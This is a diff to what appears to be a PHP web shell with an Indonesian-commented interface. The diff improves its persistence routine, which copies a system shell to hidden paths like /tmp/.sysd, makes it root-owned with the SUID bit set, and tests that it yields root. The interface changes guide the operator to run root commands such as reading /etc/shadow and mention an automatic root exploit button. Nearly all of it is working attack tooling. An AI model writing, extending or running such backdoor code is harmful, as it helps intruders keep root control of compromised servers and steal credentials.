@@ -2944,67 +2944,111 @@ function install_persistence_mechanisms() {
     
     // 🎯 SUID BACKDOOR - Untuk Interactive Root Terminal
     // Hanya bisa dibuat jika kita sudah punya root access
-    $suid_paths = ['/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root'];
+    
+    // Cek apakah /tmp memiliki nosuid mount option
+    $mount_check = execute_shell_command("mount | grep 'on /tmp' 2>/dev/null || echo 'NO_TMP_MOUNT'");
+    $tmp_nosuid = (strpos($mount_check, 'nosuid') !== false);
+    
+    // Cek kernel parameters yang mungkin blok SUID
+    $kernel_protection = execute_shell_command("sysctl fs.protected_regular fs.suid_dumpable 2>/dev/null || echo 'UNKNOWN'");
+    
+    // Pilih lokasi berdasarkan mount options
+    if ($tmp_nosuid) {
+        // /tmp has nosuid, try other locations
+        $suid_paths = ['/var/tmp/.sysd', '/var/tmp/.hidden_root', '/dev/shm/.sysd', '.sysd'];
+    } else {
+        $suid_paths = ['/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root', '/var/tmp/.sysd'];
+    }
+    
     $suid_created = false;
     $suid_path = '';
     $suid_source = '';
+    $suid_details = '';
     
-    // Try different shell sources (bash lebih mungkin work dengan -p flag)
-    $shell_sources = ['/bin/bash', '/bin/sh', '/bin/dash'];
+    // Try different shell sources
+    $shell_sources = ['/bin/bash', '/bin/sh', '/bin/dash', '/bin/busybox'];
     
     foreach ($suid_paths as $try_path) {
         foreach ($shell_sources as $shell) {
             if (!file_exists($shell)) continue;
             
-            // Coba copy shell dan set SUID (hanya work kalau root)
-            $copy_result = execute_shell_command("cp $shell $try_path 2>&1 && chmod 4755 $try_path 2>&1 && ls -la $try_path 2>&1");
+            // Step 1: Copy shell
+            $copy_result = execute_shell_command("cp $shell $try_path 2>&1");
             
-            // Check apakah berhasil (harus owned by root dan ada SUID bit)
-            if (strpos($copy_result, 'root') !== false && 
-                (strpos($copy_result, 'rws') !== false || strpos($copy_result, 'rwxs') !== false)) {
+            // Step 2: Set owner to root (hanya work kalau root)
+            $chown_result = execute_shell_command("chown root:root $try_path 2>&1");
+            
+            // Step 3: Set SUID bit
+            $chmod_result = execute_shell_command("chmod 4755 $try_path 2>&1");
+            
+            // Step 4: Verify
+            $verify_result = execute_shell_command("ls -la $try_path 2>&1 && stat $try_path 2>&1 | grep -E 'Uid|Access|File'");
+            
+            // Check apakah benar-benar SUID + root owned
+            $has_suid = (strpos($verify_result, 'rws') !== false || strpos($verify_result, 'rwxs') !== false);
+            $has_root_owner = (strpos($verify_result, 'root root') !== false || strpos($verify_result, 'Uid: ( 0/') !== false);
+            
+            if ($has_suid && $has_root_owner) {
                 $suid_created = true;
                 $suid_path = $try_path;
                 $suid_source = $shell;
-                break 2; // Break both loops
+                $suid_details = $verify_result;
+                break 2;
             }
         }
     }
     
-    // Test SUID backdoor untuk confirm it works
+    // Test SUID backdoor dengan cara yang lebih reliable
     $suid_test = '';
+    $test_details = '';
     if ($suid_created) {
-        $test_result = execute_shell_command("echo 'id' | $suid_path -p 2>&1");
+        // Test 1: Coba jalankan id dengan script file
+        $test_script = '/tmp/.suid_test_' . time() . '.sh';
+        execute_shell_command("echo '#!/bin/sh\\nid' > $test_script && chmod 777 $test_script");
+        $test_result = execute_shell_command("$suid_path $test_script 2>&1");
+        execute_shell_command("rm -f $test_script");
+        
         if (strpos($test_result, 'uid=0(root)') !== false) {
             $suid_test = 'VERIFIED_WORKING';
         } else {
-            $suid_test = 'TEST_FAILED: ' . substr($test_result, 0, 100);
+            $suid_test = 'TEST_FAILED';
+            $test_details = $test_result;
+            
+            // Test 2: Coba dengan -p flag
+            $test_result2 = execute_shell_command("echo 'id' | $suid_path -p 2>&1");
+            if (strpos($test_result2, 'uid=0(root)') !== false) {
+                $suid_test = 'VERIFIED_WORKING_PFLAG';
+            }
         }
     }
     
-    if ($suid_created && $suid_test === 'VERIFIED_WORKING') {
+    if ($suid_created && ($suid_test === 'VERIFIED_WORKING' || $suid_test === 'VERIFIED_WORKING_PFLAG')) {
+        $p_flag = ($suid_test === 'VERIFIED_WORKING_PFLAG') ? ' -p' : '';
         $results['suid_backdoor'] = [
             'status' => 'installed',
             'path' => $suid_path,
             'source' => $suid_source,
-            'description' => 'SUID ROOT SHELL - Untuk Interactive Root Terminal',
-            'how_to_use' => "Create script file, then: $suid_path -p < script.sh",
-            'note' => 'SUID backdoor tested and working! Use -p flag to preserve root privileges.'
+            'description' => 'SUID ROOT SHELL - Working!',
+            'how_to_use' => "$suid_path$p_flag -c 'command'",
+            'note' => 'Use: ' . $suid_path . ' -c "id" to run as root'
         ];
     } elseif ($suid_created) {
         $results['suid_backdoor'] = [
-            'status' => 'installed_unverified',
+            'status' => 'installed_not_functional',
             'path' => $suid_path,
             'source' => $suid_source,
-            'description' => 'SUID ROOT SHELL - Created but test failed',
-            'how_to_use' => "$suid_path -p < script.sh",
-            'note' => 'SUID binary created but test failed: ' . $suid_test
+            'description' => 'SUID binary created but NOT WORKING',
+            'how_to_use' => 'May require kernel exploit to be active',
+            'note' => 'Created at: ' . $suid_path . ' but test failed. Kernel protections: ' . substr($kernel_protection, 0, 200),
+            'test_output' => $test_details,
+            'ls_output' => $suid_details
         ];
     } else {
         $results['suid_backdoor'] = [
             'status' => 'failed',
-            'description' => 'SUID ROOT SHELL - Requires root to create',
-            'how_to_use' => 'Need root access to create SUID binary',
-            'note' => 'Klik 🔥 GET ROOT (AUTO) dulu untuk dapatkan root, lalu klik 🔒 Persist lagi'
+            'description' => 'SUID ROOT SHELL - Failed to create',
+            'how_to_use' => 'Need root access',
+            'note' => 'Root required. /tmp nosuid: ' . ($tmp_nosuid ? 'YES' : 'NO') . '. Kernel: ' . substr($kernel_protection, 0, 100)
         ];
     }
     
@@ -3377,7 +3421,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2358</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1710</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -7181,15 +7225,18 @@ function showRootTerminal() {
 
 <span style="color:#6cf;">📋 REQUIRED STEPS:</span>
 <span style="color:#ccc;">   1. Click 🔒 Persist button in the button row ABOVE ↑</span>
-<span style="color:#ccc;">   2. Wait for "SUID backdoor" to show INSTALLED</span>
-<span style="color:#ccc;">   3. This terminal will auto-detect the backdoor</span>
-<span style="color:#ccc;">   4. Type commands here OR use main Shell tab</span>
+<span style="color:#ccc;">   2. Wait for installation to complete</span>
+<span style="color:#ccc;">   3. SUID backdoor will be created (if root is active)</span>
 
-<span style="color:#ff0;">💡 NOTE: If terminal shows "www-data", use this instead:</span>
+<span style="color:#ff0;">⚠️ IMPORTANT: SUID backdoor may NOT work on all systems!</span>
+<span style="color:#ccc;">   Kernel protections (nosuid, Yama LSM) can block SUID.</span>
+
+<span style="color:#6cf;">✅ TO USE ROOT ACCESS:</span>
 <span style="color:#0f0;">   Go to Shell tab → Run: /tmp/.hidden_root -c "id"</span>
+<span style="color:#ccc;">   OR: /tmp/.sysd -c "cat /etc/shadow"</span>
 
-<span style="color:#f80;">⏳ Waiting for SUID backdoor installation...</span>
-<span style="color:#f44;">⚠️  DO NOT CLOSE THIS MODAL!</span>`;
+<span style="color:#f80;">⏳ Waiting for persistence installation...</span>
+<span style="color:#f44;">⚠️  DO NOT CLOSE THIS MODAL until installed!</span>`;
     
     // Auto-focus input
     document.getElementById('rootTerminalInput').focus();
@@ -7222,28 +7269,24 @@ async function checkSuidBackdoor() {
             const outputEl = doc.querySelector('.output');
             const result = outputEl ? outputEl.textContent : '';
             
-            // STRICT check: must be owned by root AND have SUID bit (s in permission)
+            // Check: must be owned by root AND have SUID bit
             // Example: -rwsr-xr-x 1 root root
-            const hasRootOwner = result.includes('root') && result.includes('root');
+            const hasRootOwner = result.includes('root');
             const hasSuidBit = /rws/.test(result); // s bit di owner execute position
             const hasFile = result.includes(path.split('/').pop());
-            const notFound = result.includes('No such file') || result.includes('not found');
+            const notFound = result.includes('No such file') || result.includes('not found') || result.includes('cannot access');
             
             console.log('[RootTerminal] Checking', path, 'Result:', result.substring(0, 150));
             console.log('[RootTerminal]   hasRoot:', hasRootOwner, 'hasSUID:', hasSuidBit, 'hasFile:', hasFile, 'notFound:', notFound);
             
-            // ALL conditions must be true
             if (hasRootOwner && hasSuidBit && hasFile && !notFound) {
                 suidBackdoorPath = path;
-                updateTerminalStatus('✅ READY: Type commands or use Shell tab', '#0f0');
+                updateTerminalStatus('✅ SUID found - test with: ' + path + ' -c id', '#0f0');
                 
-                // Update output dengan pesan sukses
                 output.innerHTML += `\n<span style="color:#0f0;font-weight:bold;">✅ SUID BACKDOOR DETECTED!</span>
 <span style="color:#0f0;">   Path: ${path}</span>
-<span style="color:#0f0;">   Status: Owned by root with SUID bit set</span>
-<span style="color:#6cf;">   You can now:</span>
-<span style="color:#ccc;">   • Type commands in this terminal</span>
-<span style="color:#ccc;">   • OR use main Shell tab with: ${path} -c "command"</span>\n`;
+<span style="color:#6cf;">   Test in Shell tab with:</span>
+<span style="color:#0f0;background:#000;padding:3px 8px;border:1px solid #0f0;display:inline-block;margin:5px 0;">${path} -c "id"</span>\n`;
                 output.scrollTop = output.scrollHeight;
                 return;
             }
@@ -7333,16 +7376,18 @@ async function executeRootCommand() {
                                (result.includes('root') && !result.includes('www-data') && !result.includes('uid=33'));
                 
                 if (!isRoot && (result.includes('www-data') || result.includes('uid=33'))) {
-                    output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">⚠️ RUNNING AS WWW-DATA (NOT ROOT)</span>\n\n';
-                    output.innerHTML += '<span style="color:#ff0;">This is a known limitation of SUID shells.</span>\n\n';
-                    output.innerHTML += '<span style="color:#6cf;">✅ USE THIS INSTEAD:</span>\n\n';
-                    output.innerHTML += '<span style="color:#ccc;">1. Close this Privilege Escalation modal</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">2. Go to main "Shell" tab</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">3. Run this command:</span>\n\n';
-                    output.innerHTML += '<div style="background:#000;border:1px solid #0f0;padding:10px;margin:10px 0;font-family:monospace;">';
+                    output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">⚠️ SUID NOT WORKING - KERNEL PROTECTION</span>\n\n';
+                    output.innerHTML += '<span style="color:#ff0;">The SUID binary exists but kernel is blocking it.</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">Possible causes: nosuid mount, Yama LSM, or other kernel hardening.</span>\n\n';
+                    output.innerHTML += '<span style="color:#6cf;">✅ WORKAROUND - Use Main Shell Tab:</span>\n\n';
+                    output.innerHTML += '<span style="color:#ccc;">1. CLOSE this Privilege Escalation modal</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">2. Go to main "Shell" tab (top menu)</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">3. Run this exact command:</span>\n\n';
+                    output.innerHTML += '<div style="background:#000;border:2px solid #0f0;padding:10px;margin:10px 0;font-family:monospace;font-size:13px;">';
                     output.innerHTML += '<span style="color:#0f0;">' + suidBackdoorPath + ' -c "' + escapeHtml(cmd) + '"</span>';
                     output.innerHTML += '</div>\n\n';
-                    output.innerHTML += '<span style="color:#6cf;">This will run as root!</span>\n';
+                    output.innerHTML += '<span style="color:#ff0;">If still www-data, the SUID backdoor is NOT functional.</span>\n';
+                    output.innerHTML += '<span style="color:#888;">You may need to use the exploit directly each time.</span>\n';
                 } else {
                     output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
                 }
